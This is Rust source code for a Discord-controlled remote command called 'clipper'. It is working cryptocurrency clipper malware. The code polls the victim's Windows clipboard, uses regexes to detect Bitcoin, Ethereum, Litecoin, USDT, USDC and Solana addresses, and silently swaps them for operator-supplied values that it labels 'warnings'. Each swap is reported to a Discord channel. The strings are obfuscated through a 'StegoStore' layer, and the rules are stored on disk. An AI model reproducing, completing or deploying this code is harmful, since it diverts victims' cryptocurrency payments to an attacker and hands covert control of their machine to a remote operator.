use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;
use clipboard_win::{get_clipboard_string, set_clipboard_string};
use once_cell::sync::Lazy;
use tokio::sync::RwLock;
use std::collections::HashMap;
use std::path::PathBuf;
use std::fs;
use std::io::{Write, BufRead, BufReader};
use regex::Regex;

static CLIPPER_STATE: Lazy<RwLock<ClipperState>> = Lazy::new(|| {
    let mut crypto_warnings = HashMap::new();
    let default_msg = StegoStore::get(StringCategory::Msg, "CLIP_ERR_PLEASE_SET");
    crypto_warnings.insert(CryptoType::BTC, default_msg.clone());
    crypto_warnings.insert(CryptoType::ETH, default_msg.clone());
    crypto_warnings.insert(CryptoType::LTC, default_msg.clone());
    crypto_warnings.insert(CryptoType::USDT, default_msg.clone());
    crypto_warnings.insert(CryptoType::USDC, default_msg.clone());
    crypto_warnings.insert(CryptoType::SOL, default_msg.clone());

    RwLock::new(ClipperState {
        is_running: false,
        rules: HashMap::new(),
        last_content: String::new(),
        crypto_warnings,
    })
});

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum CryptoType {
    BTC,  ETH,
    LTC,  USDT,
    USDC, SOL,
}

impl CryptoType {
    fn as_str(&self) -> &str {
        match self {
            CryptoType::BTC => "BTC",   CryptoType::ETH => "ETH",
            CryptoType::LTC => "LTC",   CryptoType::USDT => "USDT",
            CryptoType::USDC => "USDC", CryptoType::SOL => "SOL",
        }
    }

    fn from_str(s: &str) -> Option<Self> {
        match s.to_uppercase().as_str() {
            "BTC" => Some(CryptoType::BTC),   "ETH" => Some(CryptoType::ETH),
            "LTC" => Some(CryptoType::LTC),   "USDT" => Some(CryptoType::USDT),
            "USDC" => Some(CryptoType::USDC), "SOL" => Some(CryptoType::SOL),
            _ => None,
        }
    }
}

#[derive(Debug)]
struct ClipperState {
    is_running: bool,
    rules: HashMap<String, String>,
    last_content: String,
    crypto_warnings: HashMap<CryptoType, String>,
}

pub struct ClipperCommand;

impl ClipperCommand {
    fn m(key: &str) -> String { StegoStore::get(StringCategory::Msg, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
    fn s(key: &str) -> String { StegoStore::get(StringCategory::Const, key) }
}

#[async_trait]
impl BotCommand for ClipperCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("CLIPPER_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "CLIPPER").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_UTIL").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("CLIPPER_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".clipper on", ".clipper off", ".clipper add hi hello", ".clipper list", ".clipper remove 1", ".clipper setclip btc <value>", ".clipper listclip", ".clipper status"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("CLIPPER_ALIAS1").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(action) => action,
            None => {
                self.show_help(http, msg).await?;
                return Ok(());
            }
        };

        match action {
            "on" | "start" => self.start_clipper(http, msg).await,
            "off" | "stop" => self.stop_clipper(http, msg).await,
            "add" => {
                let from = match args.next() {
                    Some(f) => f.to_string(),
                    None => {
                        http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_ADD_USAGE")).await?;
                        return Ok(());
                    }
                };
                let to = args.rest();
                if to.is_empty() {
                    http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_ADD_USAGE")).await?;
                    return Ok(());
                }
                self.add_rule(http, msg, &from, &to).await
            }
            "remove" | "delete" | "rm" => {
                let index_str = match args.next() {
                    Some(i) => i,
                    None => {
                        http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_RM_USAGE")).await?;
                        return Ok(());
                    }
                };
                let index: usize = match index_str.parse() {
                    Ok(i) => i,
                    Err(_) => {
                        http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_INDEX_NUM")).await?;
                        return Ok(());
                    }
                };
                self.remove_rule(http, msg, index).await
            }
            "list" | "show" => self.list_rules(http, msg).await,
            "status" => self.show_status(http, msg).await,
            "clear" => self.clear_rules(http, msg).await,
            "setclip" | "setwarning" => {
                let crypto_type = match args.next() {
                    Some(t) => t.to_string(),
                    None => {
                        http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_SET_USAGE")).await?;
                        return Ok(());
                    }
                };

                let warning = args.rest();
                if warning.is_empty() {
                    http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_PROVIDE_WARN")).await?;
                    return Ok(());
                }

                self.set_crypto_warning(http, msg, &crypto_type, &warning).await
            }
            "listclip" | "showcrypto" => self.list_crypto_warnings(http, msg).await,
            _ => {
                http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_UNKNOWN_ACT").replace("{}", action)).await?;
                Ok(())
            }
        }
    }
}

impl ClipperCommand {
    async fn show_help(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(Self::m("CLIP_TITLE"))
            .description(Self::m("CLIP_DESC"))
            .color(0x00CED1)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: StegoStore::get(StringCategory::Core, "USAGE"),
                value: Self::m("CLIP_HELP_USAGE"),
                inline: false,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: StegoStore::get(StringCategory::Core, "COMMANDS"),
                value: Self::m("CLIP_HELP_CMDS"),
                inline: false,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: StegoStore::get(StringCategory::Core, "EXAMPLES"),
                value: Self::m("CLIP_HELP_EXAMPLES"),
                inline: false,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(StegoStore::get(StringCategory::Core, "BOT_NAME") + " Utility Commands"))
            .build();

        http.create_message_with_embeds(msg.channel_id.into(), &[embed]).await?;
        Ok(())
    }

    async fn start_clipper(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let is_running = CLIPPER_STATE.read().await.is_running;

        if is_running {
            http.create_message(msg.channel_id.get(), &Self::m("CLIP_ALREADY_RUNNING")).await?;
            return Ok(());
        }

        // Load rules from file
        if let Ok((loaded_rules, loaded_warnings)) = Self::load_rules_from_file() {
            let mut state = CLIPPER_STATE.write().await;

            // Load crypto warnings
            state.crypto_warnings = loaded_warnings;

            // Load rules
            if !loaded_rules.is_empty() {
                for (from, to) in loaded_rules {
                    state.rules.insert(from, to);
                }
            }
        }

        let rules_count = {
            let state = CLIPPER_STATE.read().await;
            if state.rules.is_empty() {
                drop(state);
                http.create_message(msg.channel_id.get(), &Self::m("CLIP_WARN_NO_RULES")).await?;
                return Ok(());
            }
            state.rules.len()
        };

        {
            let mut state = CLIPPER_STATE.write().await;
            state.is_running = true;

            // Reset last_content to empty so first copy always triggers
            state.last_content = String::new();
        }

        // Start background monitoring
        let http_clone = Arc::clone(http);
        let channel_id = msg.channel_id;
        tokio::spawn(async move {
            Self::monitor_clipboard(http_clone, channel_id).await;
        });

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(Self::m("CLIP_STARTED_TITLE"))
            .description(Self::m("CLIP_STARTED_DESC"))
            .color(0x32CD32)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: Self::m("CLIP_ACTIVE_RULES"),
                value: Self::m("CLIP_RULES_COUNT_FMT").replace("{}", &rules_count.to_string()),
                inline: false,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(Self::m("CLIP_STOP_FOOTER")))
            .build();

        http.create_message_with_embeds(msg.channel_id.into(), &[embed]).await?;
        Ok(())
    }

    async fn stop_clipper(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let is_running = CLIPPER_STATE.read().await.is_running;

        if !is_running {
            http.create_message(msg.channel_id.get(), &Self::m("CLIP_NOT_RUNNING")).await?;
            return Ok(());
        }

        CLIPPER_STATE.write().await.is_running = false;

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(Self::m("CLIP_STOPPED_TITLE"))
            .description(Self::m("CLIP_STOPPED_DESC"))
            .color(0xFF6B6B)
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(Self::m("CLIP_RESTART_FOOTER")))
            .build();

        http.create_message_with_embeds(msg.channel_id.into(), &[embed]).await?;
        Ok(())
    }

    async fn add_rule(&self, http: &Arc<HttpClient>, msg: &Message, from: &str, to: &str) -> Result<()> {
        let contains_key = CLIPPER_STATE.read().await.rules.contains_key(from);

        if contains_key {
            http.create_message(msg.channel_id.get(), &Self::m("CLIP_WARN_RULE_EXISTS").replace("{}", from)).await?;
        }

        let rules_count = {
            let mut state = CLIPPER_STATE.write().await;
            state.rules.insert(from.to_string(), to.to_string());

            // Save to file
            let _ = Self::save_rules_to_file(&state.rules, &state.crypto_warnings);

            state.rules.len()
        };

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(Self::m("CLIP_RULE_ADDED"))
            .description(Self::m("CLIP_RULE_ADDED_DESC"))
            .color(0x32CD32)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: Self::m("CLIP_FROM"),
                value: format!("`{}`", from),
                inline: true,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: Self::m("CLIP_TO"),
                value: format!("`{}`", to),
                inline: true,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                &Self::m("CLIP_TOTAL_RULES_FMT").replace("{}", &rules_count.to_string())
            ))
            .build();

        http.create_message_with_embeds(msg.channel_id.into(), &[embed]).await?;
        Ok(())
    }

    async fn remove_rule(&self, http: &Arc<HttpClient>, msg: &Message, index: usize) -> Result<()> {
        let rules_len = CLIPPER_STATE.read().await.rules.len();

        if rules_len == 0 {
            http.create_message(msg.channel_id.get(), &Self::m("CLIP_NO_RULES")).await?;
            return Ok(());
        }

        if index == 0 || index > rules_len {
            http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_INVALID_IDX").replace("{}", &rules_len.to_string())).await?;
            return Ok(());
        }

        let (key, value, rules_count) = {
            let mut state = CLIPPER_STATE.write().await;
            let key = state.rules.keys().nth(index - 1).unwrap().clone();
            let value = state.rules.remove(&key).unwrap();

            // Save to file
            let _ = Self::save_rules_to_file(&state.rules, &state.crypto_warnings);

            let rules_count = state.rules.len();
            (key, value, rules_count)
        };

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(Self::m("CLIP_RULE_REMOVED"))
            .description(&Self::m("CLIP_RULE_RM_FMT").replace("{}", &key).replace("{}", &value))
            .color(0xFF6B6B)
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                &Self::m("CLIP_REMAIN_RULES_FMT").replace("{}", &rules_count.to_string())
            ))
            .build();

        http.create_message_with_embeds(msg.channel_id.into(), &[embed]).await?;
        Ok(())
    }

    async fn list_rules(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        // Load rules from file to show current saved state
        let (file_rules, file_warnings) = Self::load_rules_from_file().unwrap_or_default();

        let is_running = CLIPPER_STATE.read().await.is_running;

        if file_rules.is_empty() && file_warnings.values().all(|v| v == &Self::m("CLIP_ERR_PLEASE_SET")) {
            http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_NO_RULES_CONFIG")).await?;
            return Ok(());
        }

        let mut rules_description = String::new();
        if !file_rules.is_empty() {
            for (i, (from, to)) in file_rules.iter().enumerate() {
                rules_description.push_str(&Self::m("CLIP_RULES_FMT")
                    .replace("{}", &(i + 1).to_string())
                    .replace("{}", from)
                    .replace("{}", to));
            }
        } else {
            rules_description = Self::m("CLIP_NO_TEXT_RULES");
        }

        let mut crypto_description = String::new();
        let has_custom_warnings = file_warnings.values().any(|v| v != &Self::m("CLIP_ERR_PLEASE_SET"));

        if has_custom_warnings {
            for crypto_type in [CryptoType::BTC, CryptoType::ETH, CryptoType::LTC, CryptoType::USDT, CryptoType::USDC, CryptoType::SOL] {
                if let Some(warning) = file_warnings.get(&crypto_type) {
                    if warning != &Self::m("CLIP_ERR_PLEASE_SET") {
                        crypto_description.push_str(&Self::m("CLIP_CRYPTO_FMT")
                            .replace("{}", crypto_type.as_str())
                            .replace("{}", warning));
                    }
                }
            }
        } else {
            crypto_description = Self::m("CLIP_HAS_CUSTOM_WARNS");
        }

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(Self::m("CLIP_RULES_LIST_TITLE"))
            .description(rules_description)
            .color(0x00CED1)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: Self::m("CLIP_CRYPTO_TITLE"),
                value: crypto_description,
                inline: false,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: StegoStore::get(StringCategory::Core, "STATUS"),
                value: if is_running { Self::m("CLIP_STATUS_RUNNING") } else { Self::m("CLIP_STATUS_STOPPED") },
                inline: false,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(Self::m("CLIP_LIST_FOOTER")))
            .build();

        http.create_message_with_embeds(msg.channel_id.into(), &[embed]).await?;
        Ok(())
    }

    async fn show_status(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let (is_running, rules_count) = {
            let state = CLIPPER_STATE.read().await;
            (state.is_running, state.rules.len())
        };

        let status_text = if is_running { Self::m("CLIP_STATUS_RUNNING") } else { Self::m("CLIP_STATUS_STOPPED") };
        let color = if is_running { 0x32CD32 } else { 0xFF6B6B };

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(Self::m("CLIP_STATUS_TITLE"))
            .color(color)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: Self::m("CLIP_STATUS_VAL"),
                value: status_text,
                inline: true,
            })
            .field(twilight_model::channel::message::embed::EmbedField {
                name: Self::m("CLIP_RULES_VAL"),
                value: format!("{} rule(s)", rules_count),
                inline: true,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(Self::m("CLIP_STATUS_FOOTER")))
            .build();

        http.create_message_with_embeds(msg.channel_id.into(), &[embed]).await?;
        Ok(())
    }

    async fn clear_rules(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let count = {
            let mut state = CLIPPER_STATE.write().await;
            let count = state.rules.len();
            state.rules.clear();

            // Save to file (empty)
            let _ = Self::save_rules_to_file(&state.rules, &state.crypto_warnings);

            count
        };

        http.create_message(msg.channel_id.get(), &Self::m("CLIP_CLEARED_FMT").replace("{}", &count.to_string())).await?;
        Ok(())
    }

    async fn set_crypto_warning(&self, http: &Arc<HttpClient>, msg: &Message, crypto_str: &str, warning: &str) -> Result<()> {
        let crypto_type = match CryptoType::from_str(crypto_str) {
            Some(t) => t,
            None => {
                http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_INVALID_CRYPTO").replace("{}", crypto_str)).await?;
                return Ok(());
            }
        };

        {
            let mut state = CLIPPER_STATE.write().await;
            state.crypto_warnings.insert(crypto_type, warning.to_string());

            // Save to file
            let _ = Self::save_rules_to_file(&state.rules, &state.crypto_warnings);
        }

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(Self::m("CLIP_WARN_UPDATED_FMT_TITLE").replace("{}", crypto_type.as_str()))
            .description(Self::m("CLIP_WARN_UPDATED_FMT_DESC").replace("{}", crypto_type.as_str()))
            .color(0x32CD32)
            .field(twilight_model::channel::message::embed::EmbedField {
                name: Self::m("CLIP_NEW_WARNING"),
                value: format!("`{}`", warning),
                inline: false,
            })
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                Self::m("CLIP_REPLACE_DETECT_FMT").replace("{}", crypto_type.as_str())
            ))
            .build();

        http.create_message_with_embeds(msg.channel_id.into(), &[embed]).await?;
        Ok(())
    }

    async fn list_crypto_warnings(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let warnings = {
            let state = CLIPPER_STATE.read().await;
            state.crypto_warnings.clone()
        };

        let mut description = String::new();
        for crypto_type in [CryptoType::BTC, CryptoType::ETH, CryptoType::LTC, CryptoType::USDT, CryptoType::USDC, CryptoType::SOL] {
            if let Some(warning) = warnings.get(&crypto_type) {
                description.push_str(&Self::m("CLIP_CRYPTO_FMT")
                    .replace("{}", crypto_type.as_str())
                    .replace("{}", warning));
            }
        }

        let embed = twilight_util::builder::embed::EmbedBuilder::new()
            .title(Self::m("CLIP_CRYPTO_TITLE"))
            .description(description)
            .color(0x00CED1)
            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(Self::m("CLIP_LIST_FOOTER")))
            .build();

        http.create_message_with_embeds(msg.channel_id.into(), &[embed]).await?;
        Ok(())
    }

    async fn monitor_clipboard(http: Arc<HttpClient>, channel_id: twilight_model::id::Id<twilight_model::id::marker::ChannelMarker>) {
        loop {
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

            let should_continue = CLIPPER_STATE.read().await.is_running;

            if !should_continue {
                break;
            }

            if let Ok(current_content) = get_clipboard_string() {
                let (should_process, rules, crypto_warnings) = {
                    let state = CLIPPER_STATE.read().await;
                    let should_process = current_content != state.last_content && !current_content.is_empty();
                    (should_process, state.rules.clone(), state.crypto_warnings.clone())
                };

                if should_process {
                    let mut new_content = current_content.clone();
                    let mut replaced = false;
                    let mut replacements = Vec::new();

                    // Check for crypto addresses first (highest priority)
                    if let Some(detected_types) = Self::detect_specific_crypto(&new_content) {
                        new_content = Self::replace_specific_crypto(&new_content, &detected_types, &crypto_warnings);
                        replaced = true;

                        // Create replacement message
                        for crypto_type in &detected_types {
                            if let Some(warning) = crypto_warnings.get(crypto_type) {
                                replacements.push((format!("{} Address", crypto_type.as_str()), warning.clone()));
                            }
                        }
                    } else {
                        // Apply all regular rules
                        for (from, to) in &rules {
                            if new_content.contains(from.as_str()) {
                                new_content = new_content.replace(from, to);
                                replaced = true;
                                replacements.push((from.clone(), to.to_string()));
                            }
                        }
                    }

                    // If any replacement was made, update clipboard
                    if replaced {
                        if let Ok(_) = set_clipboard_string(&new_content) {
                            CLIPPER_STATE.write().await.last_content = new_content.clone();

                            // Send notification
                            let mut notify_msg = Self::m("CLIP_REPLACED_NOTIFY");
                            for (from, to) in replacements {
                                notify_msg.push_str(&format!("`{}` > `{}`\n", from, to));
                            }

                            let _ = http.create_message(channel_id.get(), &notify_msg).await;
                        }
                    } else {
                        CLIPPER_STATE.write().await.last_content = current_content;
                    }
                }
            }
        }
    }

    // Save rules to persistent storage
    fn save_rules_to_file(rules: &HashMap<String, String>, crypto_warnings: &HashMap<CryptoType, String>) -> Result<()> {
        let path = PathBuf::from(Self::s("CLIPPER_DB_PATH"));

        // Create directory if it doesn't exist
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent)?;
        }

        let mut file = fs::File::create(&path)?;

        // Save crypto warnings with special prefix
        for crypto_type in [CryptoType::BTC, CryptoType::ETH, CryptoType::LTC, CryptoType::USDT, CryptoType::USDC, CryptoType::SOL] {
            if let Some(warning) = crypto_warnings.get(&crypto_type) {
                writeln!(file, "[CRYPTO_{}]??{}", crypto_type.as_str(), warning)?;
            }
        }

        // Save rules
        for (from, to) in rules {
            writeln!(file, "{}??{}", from, to)?;
        }

        Ok(())
    }

    // Load rules from persistent storage
    fn load_rules_from_file() -> Result<(HashMap<String, String>, HashMap<CryptoType, String>)> {
        let path = PathBuf::from(Self::s("CLIPPER_DB_PATH"));

        let mut crypto_warnings = HashMap::new();
        let default_msg = StegoStore::get(StringCategory::Msg, "CLIP_ERR_PLEASE_SET");
        crypto_warnings.insert(CryptoType::BTC, default_msg.clone());
        crypto_warnings.insert(CryptoType::ETH, default_msg.clone());
        crypto_warnings.insert(CryptoType::LTC, default_msg.clone());
        crypto_warnings.insert(CryptoType::USDT, default_msg.clone());
        crypto_warnings.insert(CryptoType::USDC, default_msg.clone());
        crypto_warnings.insert(CryptoType::SOL, default_msg.clone());

        if !path.exists() {
            return Ok((HashMap::new(), crypto_warnings));
        }

        let file = fs::File::open(&path)?;
        let reader = BufReader::new(file);
        let mut rules = HashMap::new();

        for line in reader.lines() {
            if let Ok(line) = line {
                let line = line.trim();
                if line.is_empty() {
                    continue;
                }

                if let Some((from, to)) = line.split_once("??") {
                    // Check if this is a crypto warning line
                    if from.starts_with("[CRYPTO_") && from.ends_with("]") {
                        // Extract crypto type: [CRYPTO_BTC] -> BTC
                        let crypto_str = from.trim_start_matches("[CRYPTO_").trim_end_matches("]");
                        if let Some(crypto_type) = CryptoType::from_str(crypto_str) {
                            crypto_warnings.insert(crypto_type, to.to_string());
                        }
                    } else if from == "[CRYPTO_WARNING]" || from == "[BTC_WARNING]" {
                        // Support old format
                        for crypto_type in [CryptoType::BTC, CryptoType::ETH, CryptoType::LTC, CryptoType::USDT, CryptoType::USDC, CryptoType::SOL] {
                            crypto_warnings.insert(crypto_type, to.to_string());
                        }
                    } else {
                        rules.insert(from.to_string(), to.to_string());
                    }
                }
            }
        }

        Ok((rules, crypto_warnings))
    }

    // Detect specific cryptocurrency types in text
    fn detect_specific_crypto(text: &str) -> Option<Vec<CryptoType>> {
        let mut detected = Vec::new();

        // Bitcoin patterns
        let btc_legacy = Regex::new(r"\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap();
        let btc_p2sh = Regex::new(r"\b3[a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap();
        let btc_bech32 = Regex::new(r"\bbc1[a-z0-9]{39,87}\b").unwrap();

        let has_btc = btc_legacy.is_match(text) || btc_p2sh.is_match(text) || btc_bech32.is_match(text);
        if has_btc {
            detected.push(CryptoType::BTC);
        }

        // Litecoin (specific prefix L/M)
        let ltc_legacy = Regex::new(r"\b[LM][a-km-zA-HJ-NP-Z1-9]{26,34}\b").unwrap();
        let ltc_bech32 = Regex::new(r"\bltc1[a-z0-9]{39,87}\b").unwrap();
        let has_ltc = ltc_legacy.is_match(text) || ltc_bech32.is_match(text);
        if has_ltc {
            detected.push(CryptoType::LTC);
        }

        // Ethereum / ERC-20 (ETH, USDT, USDC) very specific 0x prefix
        let eth = Regex::new(r"\b0x[a-fA-F0-9]{40}\b").unwrap();
        if eth.is_match(text) {
            // ETH addresses are shared with USDT and USDC
            detected.push(CryptoType::ETH);
            detected.push(CryptoType::USDT);
            detected.push(CryptoType::USDC);
        }

        // Solana, only check if no BTC or LTC detected (they share Base58 encoding)
        // SOL addresses are typically 43-44 chars, rarely 32-34 like BTC
        if !has_btc && !has_ltc {
            let sol = Regex::new(r"\b[1-9A-HJ-NP-Za-km-z]{43,44}\b").unwrap();
            if sol.is_match(text) {
                detected.push(CryptoType::SOL);
            }
        }

        if detected.is_empty() {
            None
        } else {
            Some(detected)
        }
    }

    // Replace cryptocurrency addresses with their specific warnings
    fn replace_specific_crypto(text: &str, detected_types: &[CryptoType], crypto_warnings: &HashMap<CryptoType, String>) -> String {
        let mut result = text.to_string();

        // Replace Bitcoin addresses
        if detected_types.contains(&CryptoType::BTC) {
            if let Some(warning) = crypto_warnings.get(&CryptoType::BTC) {
                let btc_legacy = Regex::new(r"\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap();
                let btc_p2sh = Regex::new(r"\b3[a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap();
                let btc_bech32 = Regex::new(r"\bbc1[a-z0-9]{39,87}\b").unwrap();

                result = btc_legacy.replace_all(&result, warning.as_str()).to_string();
                result = btc_p2sh.replace_all(&result, warning.as_str()).to_string();
                result = btc_bech32.replace_all(&result, warning.as_str()).to_string();
            }
        }

        // Replace Ethereum/ERC-20 addresses (use ETH warning for now, could be USDT/USDC too)
        if detected_types.contains(&CryptoType::ETH) {
            if let Some(warning) = crypto_warnings.get(&CryptoType::ETH) {
                let eth = Regex::new(r"\b0x[a-fA-F0-9]{40}\b").unwrap();
                result = eth.replace_all(&result, warning.as_str()).to_string();
            }
        }

        // Replace Litecoin addresses
        if detected_types.contains(&CryptoType::LTC) {
            if let Some(warning) = crypto_warnings.get(&CryptoType::LTC) {
                let ltc_legacy = Regex::new(r"\b[LM][a-km-zA-HJ-NP-Z1-9]{26,34}\b").unwrap();
                let ltc_bech32 = Regex::new(r"\bltc1[a-z0-9]{39,87}\b").unwrap();

                result = ltc_legacy.replace_all(&result, warning.as_str()).to_string();
                result = ltc_bech32.replace_all(&result, warning.as_str()).to_string();
            }
        }

        // Replace Solana addresses
        if detected_types.contains(&CryptoType::SOL) {
            if let Some(warning) = crypto_warnings.get(&CryptoType::SOL) {
                let sol = Regex::new(r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b").unwrap();
                result = sol.replace_all(&result, warning.as_str()).to_string();
            }
        }

        result
    }
}


